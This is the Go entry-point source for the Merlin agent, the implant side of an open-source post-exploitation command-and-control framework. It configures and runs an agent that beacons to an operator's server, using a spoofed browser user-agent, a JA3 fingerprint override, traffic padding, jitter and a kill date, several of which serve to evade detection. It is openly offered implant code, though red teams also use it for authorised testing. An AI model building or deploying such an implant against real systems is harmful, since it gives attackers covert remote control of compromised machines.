// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	// Standard
	"flag"
	"fmt"
	"os"

	// 3rd Party
	"github.com/fatih/color"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients/http"
	"github.com/Ne0nd0g/merlin/pkg/agent/core"
)

// GLOBAL VARIABLES
var url = "https://127.0.0.1:443"
var protocol = "h2"
var build = "nonRelease"
var psk = "merlin"
var proxy = ""
var host = ""
var ja3 = ""
var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
var sleep = "30s"
var skew = "3000"
var killdate = "0"
var maxretry = "7"
var padding = "4096"
var opaque []byte

func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), http (HTTP/1.1 Clear-Text), h2 (HTTP/2), h2c (HTTP/2 Clear-Text), http3 (QUIC or HTTP/3.0)]")
	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
	flag.StringVar(&host, "host", host, "HTTP Host header")
	flag.StringVar(&ja3, "ja3", ja3, "JA3 signature string (not the MD5 hash). Overrides -proto flag")
	flag.StringVar(&sleep, "sleep", sleep, "Time for agent to sleep")
	flag.StringVar(&skew, "skew", skew, "Amount of skew, or variance, between agent checkins")
	flag.StringVar(&killdate, "killdate", killdate, "The date, as a Unix EPOCH timestamp, that the agent will quit running")
	flag.StringVar(&maxretry, "maxretry", maxretry, "The maximum amount of failed checkins before the agent will quit running")
	flag.StringVar(&padding, "padding", padding, "The maximum amount of data that will be randomly selected and appended to every message")
	flag.StringVar(&useragent, "useragent", useragent, "The HTTP User-Agent header string that the Agent will use while sending traffic")

	flag.Usage = usage
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", core.Version))
		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
		os.Exit(0)
	}

	core.Debug = *debug
	core.Verbose = *verbose

	// Setup and run agent
	agentConfig := agent.Config{
		Sleep:    sleep,
		Skew:     skew,
		KillDate: killdate,
		MaxRetry: maxretry,
	}
	a, err := agent.New(agentConfig)
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}

	// Get the client
	var errClient error
	clientConfig := http.Config{
		AgentID:     a.ID,
		Protocol:    protocol,
		Host:        host,
		URL:         url,
		Proxy:       proxy,
		UserAgent:   useragent,
		PSK:         psk,
		JA3:         ja3,
		Padding:     padding,
		AuthPackage: "opaque",
		Opaque:      opaque,
	}
	a.Client, errClient = http.New(clientConfig)
	if errClient != nil {
		if *verbose {
			color.Red(errClient.Error())
		}
	}

	// Start the agent
	err = a.Run()
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
	}
}

// usage prints command line options
func usage() {
	fmt.Printf("Merlin Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}
